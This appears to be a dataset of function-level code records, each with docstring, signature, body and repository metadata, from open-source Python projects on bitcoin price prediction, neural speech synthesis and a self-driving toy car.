{"docstring": "'''\nReturns a DataFrame of trades for symbol in time range\n'''\n", "func_signal": "def get_trade_df(symbol, min_ts, max_ts, convert_timestamps=False):\n", "code": "trades_db = db[symbol+'_trades']\nquery = {'timestamp': {'$gt': min_ts, '$lt': max_ts}}\ncursor = trades_db.find(query).sort('_id', pymongo.ASCENDING)\ntrades = pd.DataFrame(list(cursor))\nif not trades.empty:\n    trades = trades.set_index('_id')\n    if convert_timestamps:\n        trades.index = pd.to_datetime(trades.index, unit='s')\nreturn trades", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nReturns width of best market and midpoint for each data point in DataFrame\nof book data\n'''\n", "func_signal": "def get_width_and_mid(books):\n", "code": "best_bid = books.bids.apply(lambda x: x.price[0])\nbest_ask = books.asks.apply(lambda x: x.price[0])\nreturn best_ask-best_bid, (best_bid + best_ask)/2", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nReturns a DataFrame of book data\n'''\n", "func_signal": "def get_book_df(symbol, limit, convert_timestamps=False):\n", "code": "books_db = db[symbol+'_books']\ncursor = books_db.find().sort('_id', -1).limit(limit)\nbooks = pd.DataFrame(list(cursor))\nbooks = books.set_index('_id')\nif convert_timestamps:\n    books.index = pd.to_datetime(books.index, unit='s')\n\ndef to_df(x):\n    return pd.DataFrame(x[:10])\nreturn books.applymap(to_df).sort_index()", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nPickle convenience function\n'''\n", "func_signal": "def get_pickle(filename):\n", "code": "with open(filename, 'r') as f:\n    data = pickle.load(f)\nreturn data", "path": "model\\model.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nFits and backtests a theoretical trading strategy\n'''\n", "func_signal": "def fit_and_trade(data, cols, split, threshold):\n", "code": "data = data[data.width > 0]\nX = data[cols]\ny = data.mid30\nX_train = X.iloc[:split]\nX_test = X.iloc[split:]\ny_train = y.iloc[:split]\ny_test = y.iloc[split:]\nregressor = RandomForestRegressor(n_estimators=100,\n                                  min_samples_leaf=500,\n                                  random_state=42,\n                                  n_jobs=-1)\nregressor.fit(X_train.values, y_train.values)\ntrade(X_test.values, y_test.values, regressor, threshold)", "path": "model\\strategy.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nReturns the percent change of an average of order prices weighted by inverse\ndistance-wieghted volume for each data point in DataFrame of book data\n'''\n\n", "func_signal": "def get_power_adjusted_price(books, n=10, power=2):\n", "code": "def calc_adjusted_price(book):\n    def calc(x):\n        return x.amount*(.5*book.width/(x.price-book.mid))**power\n    bid_inv = 1/book.bids.iloc[:n].apply(calc, axis=1)\n    ask_inv = 1/book.asks.iloc[:n].apply(calc, axis=1)\n    bid_price = book.bids.price.iloc[:n]\n    ask_price = book.asks.price.iloc[:n]\n    return (bid_price*bid_inv + ask_price*ask_inv).sum() /\\\n        (bid_inv + ask_inv).sum()\nadjusted = books.apply(calc_adjusted_price, axis=1)\nreturn (adjusted/books.mid).apply(log).fillna(0)", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nReturns percent change of future midpoints for each data point in DataFrame\nof book data\n'''\n\n", "func_signal": "def get_future_mid(books, offset, sensitivity):\n", "code": "def future(timestamp):\n    i = books.index.get_loc(timestamp+offset, method='nearest')\n    if abs(books.index[i] - (timestamp+offset)) < sensitivity:\n        return books.mid.iloc[i]\nreturn (books.index.map(future)/books.mid).apply(log)", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nReturns indexes of trades in offset range for each data point in DataFrame\nof book data\n'''\n", "func_signal": "def get_trades_indexes(books, trades, offset, live=False):\n", "code": "def indexes(ts):\n    ts = int(ts)\n    i_0 = trades.timestamp.searchsorted([ts-offset], side='left')[0]\n    if live:\n        i_n = -1\n    else:\n        i_n = trades.timestamp.searchsorted([ts-1], side='right')[0]\n    return (i_0, i_n)\nreturn books.index.map(indexes)", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nGets json from the API\n'''\n", "func_signal": "def get_json(url):\n", "code": "resp = urllib2.urlopen(url)\nreturn json.load(resp, object_hook=format_trade), resp.getcode()", "path": "collect-data\\collect_trades.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nReturns a count of trades for each data point in DataFrame of book data\n'''\n", "func_signal": "def get_trades_count(books, trades):\n", "code": "def count(x):\n    return len(trades.iloc[x.indexes[0]:x.indexes[1]])\nreturn books.apply(count, axis=1)", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nFormats trade data\n'''\n", "func_signal": "def format_trade(trade):\n", "code": "if all(key in trade for key in ('tid', 'amount', 'price', 'timestamp')):\n    trade['_id'] = trade.pop('tid')\n    trade['amount'] = float(trade['amount'])\n    trade['price'] = float(trade['price'])\n    trade['timestamp'] = float(trade['timestamp'])\n\nreturn trade", "path": "collect-data\\collect_trades.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "'''\nReturns a measure of whether trade aggressors were buyers or sellers for\neach data point in DataFrame of book data\n'''\n\n", "func_signal": "def get_aggressor(books, trades):\n", "code": "def aggressor(x):\n    trades_n = trades.iloc[x.indexes[0]:x.indexes[1]]\n    if trades_n.empty:\n        return 0\n    buys = trades_n['type'] == 'buy'\n    buy_vol = trades_n[buys].amount.sum()\n    sell_vol = trades_n[~buys].amount.sum()\n    return buy_vol - sell_vol\nreturn books.apply(aggressor, axis=1)", "path": "model\\features.py", "repo_name": "cbyn/bitpredict", "stars": 737, "license": "mit", "language": "python", "size": 3360}
{"docstring": "\"\"\"Compute one hot encoding.\n\ngiven a tensor t of dimension d with integer values from range(r), return a\nnew tensor of dimension d + 1 with values 0/1, where the last dimension\ngives a one-hot representation of the values in t.\nif r is not given, r is set to max(t) + 1\n\n\"\"\"\n", "func_signal": "def one_hot(t, r=None):\n", "code": "if r is None:\n    r = tensor.max(t) + 1\n\nranges = tensor.shape_padleft(tensor.arange(r), t.ndim)\nreturn tensor.eq(ranges, tensor.shape_padright(t, 1))", "path": "model.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nNLL for Multivariate Normal with diagonal covariance matrix\nSee:\n    wikipedia.org/wiki/Multivariate_normal_distribution#Likelihood_function\nwhere \\Sigma = diag(s_1^2,..., s_n^2).\n\nx, mus, sigmas all should have the same shape.\nsigmas (s_1,..., s_n) should be strictly positive.\nResults in output shape of similar but without the last dimension.\n\"\"\"\n", "func_signal": "def gaussian_nll(x, mus, sigmas):\n", "code": "nll = lib.floatX(numpy.log(2. * numpy.pi))\nnll += 2. * T.log(sigmas)\nnll += ((x - mus) / sigmas) ** 2.\nnll = nll.sum(axis=-1)\nnll *= lib.floatX(0.5)\nreturn nll", "path": "sampleRNN\\lib\\ops.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nfloats in (0, 1) to ints in [0, q_levels-1]\nscales normalized across axis 1\n\"\"\"\n# Normalization is on mini-batch not whole file\n#eps = numpy.float64(1e-5)\n#data -= data.min(axis=1)[:, None]\n#data *= ((q_levels - eps) / data.max(axis=1)[:, None])\n#data += eps/2\n#data = data.astype('int32')\n\n", "func_signal": "def __linear_quantize(data, q_levels):\n", "code": "eps = numpy.float64(1e-5)\ndata *= (q_levels - eps)\ndata += eps/2\ndata = data.astype('int32')\nreturn data", "path": "quantize.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nOne of 'linear', 'a-law', 'mu-law' for q_type.\n\"\"\"\n", "func_signal": "def __batch_quantize(data, q_levels, q_type):\n", "code": "data = data.astype('float64')\ndata = __normalize(data)\nif q_type == 'linear':\n    return __linear_quantize(data, q_levels)\nif q_type == 'a-law':\n    return __a_law_quantize(data)\nif q_type == 'mu-law':\n    # from [0, 1] to [-1, 1]\n    data = 2.*data-1.\n    # Automatically quantized to 256 bins.\n    data = __mu_law_quantize(data)\n    return data\nraise NotImplementedError", "path": "quantize.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nLoads log file and plot x and y values as provided by input.\nSaves as <path>/train_log.png\n\"\"\"\n", "func_signal": "def plot_traing_info(x, ylist, path):\n", "code": "file_name = os.path.join(path, __train_log_file_name)\ntry:\n    with open(file_name, \"rb\") as f:\n        log = pickle.load(f)\nexcept IOError:  # first time\n    warnings.warn(\"There is no {} file here!!!\".format(file_name))\n    return\nplt.figure()\nx_vals = log[x]\nfor y in ylist:\n    y_vals = log[y]\n    if len(y_vals) != len(x_vals):\n        warning.warn(\"One of y's: {} does not have the same length as x:{}\".format(y, x))\n    plt.plot(x_vals, y_vals, label=y)\n    # assert len(y_vals) == len(x_vals), \"not the same len\"\nplt.xlabel(x)\nplt.legend()\n#plt.show()\nplt.savefig(file_name[:-3]+'png', bbox_inches='tight')\nplt.close('all')", "path": "sampleRNN\\lib\\__init__.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nTraverse the Theano graph starting at `node` and return a list of all nodes\nwhich match the `critereon` function. When optimizing a cost function, you\ncan use this to get a list of all of the trainable params in the graph, like\nso:\n\n`lib.search(cost, lambda x: hasattr(x, \"param\"))`\nor\n`lib.search(cost, lambda x: hasattr(x, \"param\") and x.param==True)`\n\"\"\"\n\n", "func_signal": "def search(node, critereon):\n", "code": "def _search(node, critereon, visited):\n    if node in visited:\n        return []\n    visited.add(node)\n\n    results = []\n    if isinstance(node, T.Apply):\n        for inp in node.inputs:\n            results += _search(inp, critereon, visited)\n    else: # Variable node\n        if critereon(node):\n            results.append(node)\n        if node.owner is not None:\n            results += _search(node.owner, critereon, visited)\n    return results\n\nreturn _search(node, critereon, set())", "path": "sampleRNN\\lib\\__init__.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\n:temperature: default 1.\nFor high temperatures (temperature -> +Inf), all actions have nearly the same\nprobability and the lower the temperature, the more expected rewards affect\nthe probability. For a low temperature (temperature -> 0+), the probability of\nthe action with the highest expected reward (max operation) tends to 1.\n\"\"\"\n", "func_signal": "def softmax_and_sample(logits, temperature=1.):\n", "code": "temperature = lib.floatX(temperature)\nZEROX = lib.floatX(0.)\nassert temperature >= ZEROX, \"`temperature` should be a non-negative value!\"\nold_shape = logits.shape\nflattened_logits = logits.reshape((-1, logits.shape[logits.ndim-1]))\n\nif temperature == ZEROX:\n    # Get max instead of (biased) sample.\n    # Equivalent to directly get the argmax but with this it's easier to\n    # extract the probabilities later on too.\n    samples = T.nnet.softmax(flattened_logits)\nelse: # > 0\n    flattened_logits /= temperature\n    samples = T.cast(\n        srng.multinomial(pvals=T.nnet.softmax(flattened_logits)),\n        theano.config.floatX\n    )\nsamples = samples.reshape(old_shape)\nreturn T.argmax(samples, axis=samples.ndim-1)", "path": "sampleRNN\\lib\\ops.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nGets a 2D tensor (A, B), outputs a 3D tensor (A, num, B)\n:usage:\n    >>> TODO\n\"\"\"\n", "func_signal": "def extend_middle_dim(_2D, num):\n", "code": "rval = _2D.dimshuffle((0, 'x', 1))\nrval = T.alloc(rval, rval.shape[0], num, rval.shape[2])\nreturn rval", "path": "sampleRNN\\lib\\ops.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\n:todo:\n    - Fix according to _param\n    - Test!\n\nFrom Cho's code here:\n    https://github.com/nyu-dl/dl4mt-tutorial/blob/master/session2/nmt.py#L45\n\"\"\"\n", "func_signal": "def dropout_layer(state_before, use_noise, trng):\n", "code": "proj = tensor.switch(\n    use_noise,\n    # for training\n    state_before * trng.binomial(state_before.shape, p=0.5, n=1,\n                                 dtype=state_before.dtype),\n    # for validation/sampling\n    state_before * 0.5)\nreturn proj", "path": "sampleRNN\\lib\\ops.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"To range [0., 1.]\"\"\"\n", "func_signal": "def __normalize(data):\n", "code": "data -= data.min(axis=1)[:, None]\ndata /= data.max(axis=1)[:, None]\nreturn data", "path": "quantize.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nD is dimension of each observation (e.g. frame_size) for each component\n(multivariate Normal with diagonal covariance matrix)\nSee `gaussian_nll`\n\nx : (batch_size, D)\nmus : (batch_size, D, num_gaussians)\nsigmas : (batch_size, D, num_gaussians)\nmix_weights : (batch_size, num_gaussians)\n\"\"\"\n", "func_signal": "def GMM_nll(x, mus, sigmas, mix_weights):\n", "code": "x = x.dimshuffle(0, 1, 'x')\n\n# Similar to `gaussian_nll`\nll_component_wise = lib.floatX(numpy.log(2. * numpy.pi))\nll_component_wise += 2. * T.log(sigmas)\nll_component_wise += ((x - mus) / sigmas) ** 2.\nll_component_wise = ll_component_wise.sum(axis=1)  # on FRAME_SIZE\nll_component_wise *= lib.floatX(-0.5)  # LL not NLL\n\n# Now ready to take care of weights of each component\n# Simply applying exp could potentially cause inf/NaN.\n# Look up LogSumExp trick, Softmax in theano, or this:\n# hips.seas.harvard.edu/blog/2013/01/09/computing-log-sum-exp/\nweighted_ll = ll_component_wise + T.log(mix_weights)\nll_max = T.max(weighted_ll, axis=1, keepdims=True)\nnll = T.log(T.sum(T.exp(weighted_ll - ll_max), axis=1, keepdims=True))\nnll += ll_max\nnll = -nll.sum(axis=1)\nreturn nll", "path": "sampleRNN\\lib\\ops.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"Gaussian mixture model negative log-likelihood.\n\nComputes the cost.\n\n\"\"\"\n", "func_signal": "def cost_gmm(y, mu, sig, weight):\n", "code": "n_dim = y.ndim\nshape_y = y.shape\n\nk = weight.shape[-1]\n\ny = y.reshape((-1, shape_y[-1]))\ny = tensor.shape_padright(y)\n\nmu = mu.reshape((-1, shape_y[-1], k))\nsig = sig.reshape((-1, shape_y[-1], k))\nweight = weight.reshape((-1, k))\n\ndiff = tensor.sqr(y - mu)\n\ninner = -0.5 * tensor.sum(\n    diff / sig**2 +\n    2 * tensor.log(sig) + tensor.log(2 * numpy.pi), axis=-2)\n\nnll = -logsumexp(tensor.log(weight) + inner, axis=-1)\n\nreturn nll.reshape(shape_y[:-1], ndim=n_dim - 1)", "path": "model.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nFrom Joao\nx should be normalized between -1 and 1\nConverts an array according to mu-law and discretizes it\n\nNote:\n    mu2linear(linear2mu(x)) != x\n    Because we are compressing to 8 bits here.\n    They will sound pretty much the same, though.\n\n:usage:\n    >>> bitrate, samples = scipy.io.wavfile.read('orig.wav')\n    >>> norm = __normalize(samples)[None, :]  # It takes 2D as inp\n    >>> mu_encoded = linear2mu(2.*norm-1.)  # From [0, 1] to [-1, 1]\n    >>> print mu_encoded.min(), mu_encoded.max(), mu_encoded.dtype\n    0, 255, dtype('int16')\n    >>> mu_decoded = mu2linear(mu_encoded)  # Back to linear\n    >>> print mu_decoded.min(), mu_decoded.max(), mu_decoded.dtype\n    -1, 0.9574371, dtype('float32')\n\"\"\"\n", "func_signal": "def linear2mu(x, mu=255):\n", "code": "x_mu = np.sign(x) * np.log(1 + mu*np.abs(x))/np.log(1 + mu)\nreturn ((x_mu + 1)/2 * mu).astype('int16')", "path": "quantize.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nGets a set of values as dictionary and append them to a log file.\nstores in <path>/train_log.pkl\n\"\"\"\n", "func_signal": "def save_training_info(values, path):\n", "code": "file_name = os.path.join(path, __train_log_file_name)\ntry:\n    with open(file_name, \"rb\") as f:\n        log = pickle.load(f)\nexcept IOError:  # first time\n    log = {}\n    for k in values.keys():\n        log[k] = []\nfor k, v in values.items():\n    log[k].append(v)\nwith open(file_name, \"wb\") as f:\n    pickle.dump(log, f)", "path": "sampleRNN\\lib\\__init__.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nFrom Joao with modifications\nConverts an integer array from mu to linear\n\nFor important notes and usage see: linear2mu\n\"\"\"\n", "func_signal": "def mu2linear(x, mu=255):\n", "code": "mu = float(mu)\nx = x.astype('float32')\ny = 2. * (x - (mu+1.)/2.) / (mu+1.)\nreturn np.sign(y) * (1./mu) * ((1. + mu)**np.abs(y) - 1.)", "path": "quantize.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nNote:\n    Alternative implementation of `theano.tensor.concatenate`.\n    This function does exactly the same thing, but contrary to Theano's own\n    implementation, the gradient is implemented on the GPU.\n    Backpropagating through `theano.tensor.concatenate` yields slowdowns\n    because the inverse operation (splitting) needs to be done on the CPU.\n    This implementation does not have that problem.\n\nFrom Cho's code here:\n    https://github.com/nyu-dl/dl4mt-tutorial/blob/master/session2/nmt.py#L115\n\n:usage:\n    >>> x, y = theano.tensor.matrices('x', 'y')\n    >>> c = concatenate([x, y], axis=1)\n\n:parameters:\n    - tensor_list : list\n        list of Theano tensor expressions that should be concatenated.\n    - axis : int\n        the tensors will be joined along this axis.\n\n:returns:\n    - out : tensor\n        the concatenated tensor expression.\n\n:todo:\n    - Doesn't work properly when input tensors have all False broadcastable\n      patterns. (E.g. LowMemLSTM and LowMemGRU)\n\"\"\"\n", "func_signal": "def concatenate(tensor_list, axis=0):\n", "code": "concat_size = sum(tt.shape[axis] for tt in tensor_list)\n\noutput_shape = ()\nfor k in range(axis):\n    output_shape += (tensor_list[0].shape[k],)\noutput_shape += (concat_size,)\nfor k in range(axis + 1, tensor_list[0].ndim):\n    output_shape += (tensor_list[0].shape[k],)\n\nout = T.zeros(output_shape)\noffset = 0\nfor tt in tensor_list:\n    indices = ()\n    for k in range(axis):\n        indices += (slice(None),)\n    indices += (slice(offset, offset + tt.shape[axis]),)\n    for k in range(axis + 1, tensor_list[0].ndim):\n        indices += (slice(None),)\n\n    out = T.set_subtensor(out[indices], tt)\n    offset += tt.shape[axis]\n\nreturn out", "path": "sampleRNN\\lib\\ops.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "# Used to predict the values using the dataset\n\n", "func_signal": "def sample_using_input(self, data_tr, num_samples):\n", "code": "features, features_mask, labels, labels_mask, speaker, start_flag, raw_sequence = \\\n    self.symbolic_input_variables()\n\ncost, updates, attention_vars = self.compute_cost(\n    features, features_mask, labels, labels_mask,\n    speaker, start_flag, num_samples)\nsample_x, k, w, pi, phi, pi_att = attention_vars\n\ntheano_vars = [\n    features, features_mask, labels, labels_mask, speaker, start_flag]\ntheano_vars = [x for x in theano_vars if x is not None]\ntheano_vars = list(set(theano_vars))\ntheano_vars = {x.name: x for x in theano_vars}\n\ntheano_inputs = []\nnumpy_inputs = []\n\nfor key in data_tr.keys():\n    theano_inputs.append(theano_vars[key])\n    numpy_inputs.append(data_tr[key])\n\nreturn function(\n    theano_inputs, [sample_x, k, w, pi, phi, pi_att],\n    updates=updates)(*numpy_inputs)", "path": "model.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nFirst, sample according to the prior mixing probabilities\nto choose the component density.\nSecond, draw sample from that density\n\nInspired by implementation in `cle`\n\"\"\"\n", "func_signal": "def GMM_sample(mus, sigmas, mix_weights):\n", "code": "chosen_component = \\\n    T.argmax(\n        srng.multinomial(pvals=mix_weights),\n        axis=1)\nselected_mus = mus[T.arange(mus.shape[0]), :, chosen_component]\nselected_sigmas = sigmas[T.arange(sigmas.shape[0]), :, chosen_component]\nsample = srng.normal(size=selected_mus.shape,\n                            avg=0.,\n                            std=1.)\nsample *= selected_sigmas\nsample += selected_mus\nreturn sample, selected_mus, selected_sigmas, chosen_component", "path": "sampleRNN\\lib\\ops.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nuniform distribution with the given stdev and size\n\nFrom Ishaan's code:\n    https://github.com/igul222/speech\n\"\"\"\n", "func_signal": "def uniform(stdev, size):\n", "code": "return numpy.random.uniform(\n    low=-stdev * numpy.sqrt(3),\n    high=stdev * numpy.sqrt(3),\n    size=size\n).astype(theano.config.floatX)", "path": "sampleRNN\\lib\\ops.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nA wrapper for `theano.shared` which enables parameter sharing in models.\n\nCreates and returns theano shared variables similarly to `theano.shared`,\nexcept if you try to create a param with the same name as a\npreviously-created one, `param(...)` will just return the old one instead of\nmaking a new one.\n\nThis constructor also adds a `param` attribute to the shared variables it\ncreates, so that you can easily search a graph for all params.\n\"\"\"\n\n", "func_signal": "def param(name, *args, **kwargs):\n", "code": "if name not in _params:\n    kwargs['name'] = name\n    param = theano.shared(*args, **kwargs)\n    param.param = True\n    _params[name] = param\nreturn _params[name]", "path": "sampleRNN\\lib\\__init__.py", "repo_name": "sotelo/parrot", "stars": 610, "license": "None", "language": "python", "size": 24316}
{"docstring": "\"\"\"\nMain script to generate tfrecords from a tuple of np.arrays.\n\"\"\"\n", "func_signal": "def main():\n", "code": "description = \"Generates tfrecords from a tuple of np.arrays\"\nparser = argparse.ArgumentParser(description=description)\nparser.add_argument('data_path',\n                    type=str, help='path to data array')\nparser.add_argument('label_path',\n                    type=str, help='path to labels array')\nparser.add_argument(\"-he\",\n                    \"--height\",\n                    type=int,\n                    default=90,\n                    help=\"height number (default=90)\")\nparser.add_argument(\"-w\",\n                    \"--width\",\n                    type=int,\n                    default=160,\n                    help=\"width number (default=160)\")\nparser.add_argument(\"-c\",\n                    \"--channels\",\n                    type=int,\n                    default=3,\n                    help=\"number of channels (default=3)\")\n\nparser.add_argument(\"-n\",\n                    \"--name\",\n                    type=str,\n                    default=\"data\",\n                    help=\"name for tfrecords e.g. pure, flip, aug, bin, gray, green (default=data)\")  # noqa\n\nparser.add_argument(\"-f\",\n                    \"--flip\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"flag to flip x-axis (default=False)\")\n\nparser.add_argument(\"-p\",\n                    \"--pure\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"flag to pure (default=False)\")\n\nparser.add_argument(\"-a\",\n                    \"--augmentation\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"flag to augment dataset (default=False)\")\n\nparser.add_argument(\"-gy\",\n                    \"--gray\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"flag to transform dataset in grayscale (default=False)\")  # noqa\n\nparser.add_argument(\"-gr\",\n                    \"--green\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"flag to keep only the green channel (default=False)\")  # noqa\n\nparser.add_argument(\"-b\",\n                    \"--binary\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"flag to binarize dataset (default=False)\")\n\nargs = parser.parse_args()\nrecords_generator(args.height,\n                  args.width,\n                  args.channels,\n                  args.data_path,\n                  args.label_path,\n                  args.name,\n                  args.flip,\n                  args.augmentation,\n                  args.gray,\n                  args.green,\n                  args.binary)", "path": "self_driving\\ml_training\\generate_tfrecords.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nGet all attributs values.\n\n:return: all hyperparams as a string\n:rtype: str\n\"\"\"\n", "func_signal": "def __str__(self):\n", "code": "if self.kernel_sizes is None:\n    kernel_sizes = [5] * len(self.conv_architecture)\nelse:\n    kernel_sizes = self.kernel_sizes\nif self.pool_kernel is None:\n    pool_kernel = [2] * len(self.conv_architecture)\nelse:\n    pool_kernel = self.pool_kernel\nif self.activations is None:\n    activations = [\"relu\"] * len(self.architecture)\nelse:\n    activations = self.activations\nstatus = \"height = {}\\n\".format(self.height)\nstatus += \"width = {}\\n\".format(self.width)\nstatus += \"channels = {}\\n\".format(self.channels)\nstatus += \"architecture = {}\\n\".format(self.architecture)\nstatus += \"activations = {}\\n\".format(activations)\nstatus += \"batch_size = {}\\n\".format(self.batch_size)\nstatus += \"conv_architecture = {}\\n\".format(self.conv_architecture)\nstatus += \"kernel_sizes = {}\\n\".format(kernel_sizes)\nstatus += \"pool_kernel = {}\\n\".format(pool_kernel)\nstatus += \"batch_size = {}\\n\".format(self.batch_size)\nstatus += \"epochs = {}\\n\".format(self.epochs)\nstatus += \"num_steps = {}\\n\".format(self.num_steps)\nstatus += \"save_step = {}\\n\".format(self.save_step)\nstatus += \"learning_rate = {}\\n\".format(self.learning_rate)\nstatus += \"optimizer = {}\\n\".format(self.optimizer)\nreturn status", "path": "self_driving\\ml_training\\Config.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nExecute one action of moving left\n\"\"\"\n", "func_signal": "def move_left(self):\n", "code": "self.rightMotor.weak_turn(self.power_left, self.tacho_left)\nself.leftMotor.weak_turn(- self.power_left, self.tacho_left)", "path": "self_driving\\nxt_car\\DiffCar.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nCut off randomly part\nof the top and bottom of\ninput_image and reshape it to the original dimensions\n\n:param input_image: image\n:type input_image: numpy.ndarray\n:return: cropped image\n:rtype: numpy.ndarray\n\"\"\"\n", "func_signal": "def top_bottom_cut(input_image):\n", "code": "height = input_image.shape[0]\nwidth = input_image.shape[1]\ninput_dtype = input_image.dtype\ntop = int(np.random.uniform(.325, .425) * height)\nbottom = int(np.random.uniform(.075, .175) * height)\ninput_image = input_image[top:-bottom, :]\nimg = Image.fromarray(input_image)\nimg = img.resize((width, height), Image.LANCZOS)\ncut_image = np.array(img).astype(input_dtype)\nreturn cut_image", "path": "self_driving\\vision\\image_manipulation.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nExecute one action of moving rigth\n\"\"\"\n", "func_signal": "def move_right(self):\n", "code": "self.rightMotor.weak_turn(- self.power_right, self.tacho_right)\nself.leftMotor.weak_turn(self.power_right, self.tacho_right)", "path": "self_driving\\nxt_car\\DiffCar.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nChange type and shape of the image's array\naccording to self.mode.\n\n:param img: image\n:type img: np.array\n:return: image\n:rtype: np.array\n\"\"\"\n", "func_signal": "def image2float(self, img):\n", "code": "if self.mode == \"pure\":\n    img = img.astype(np.float32) / 255\n    img = img.reshape((1, img.shape[0] * img.shape[1] * img.shape[2]))\n    return img\nelse:\n    img = img.astype(np.float32) / 255\n    img = img.reshape((1, img.shape[0] * img.shape[1]))\nreturn img", "path": "self_driving\\DiffController.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nConvert input_image to binary representation\n\n:param input_image: image\n:type input_image: numpy.ndarray\n:param threshold_value: value to be used as a\n                      threshold\n:type threshold_value: int\n:return: image in binary form\n:rtype: numpy.ndarray\n\"\"\"\n", "func_signal": "def binarize_image(input_image, threshold_value=177):\n", "code": "gray_image = grayscale_image(input_image)\nbin_image = cv2.GaussianBlur(gray_image, (5, 5), 0)\n_, bin_image = cv2.threshold(bin_image,\n                             threshold_value,\n                             255,\n                             cv2.THRESH_BINARY + cv2.THRESH_OTSU)\nreturn bin_image", "path": "self_driving\\vision\\image_manipulation.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nThe car drives itself until the key \"q\" is pressed.\nAll captured images are stored in the folder \"debug_run\"\nto check the model's performance.\n\"\"\"\n", "func_signal": "def drive_debug(self):\n", "code": "if not os.path.exists(\"debug_run\"):\n    os.makedirs(\"debug_run\")\nlast_command = None\ncount = 0\nwhile True:\n    init = time.time()\n    img, original_img = self.cam.take_picture()\n    init = time.time() - init\n    print(\"take_picture_time = {0:.3f}\".format(init))\n\n    if key.is_pressed('q'):\n        print('Exiting...')\n        self.robot.idle()\n        break\n    else:\n        img_flatt = self.image2float(img)\n        init = time.time()\n        command, prob = self.get_command_and_prob(img_flatt)\n        init = time.time() - init\n        print(\"foward_time = {0:.3f}\".format(init))\n        commands = ['up', 'left', 'right']\n        commands_prob = []\n        for i, com in enumerate(commands):\n            commands_prob.append(com + \":{0:.2f}\".format(prob[i]))\n        print(commands_prob)\n        print(command)\n        name = os.path.join(\"debug_run\", str(count) + \".png\")\n        write_img(original_img, commands_prob, name)\n        if command == 'up':\n            self.robot.move_up()\n            time.sleep(0.05)\n        elif command == 'down':\n            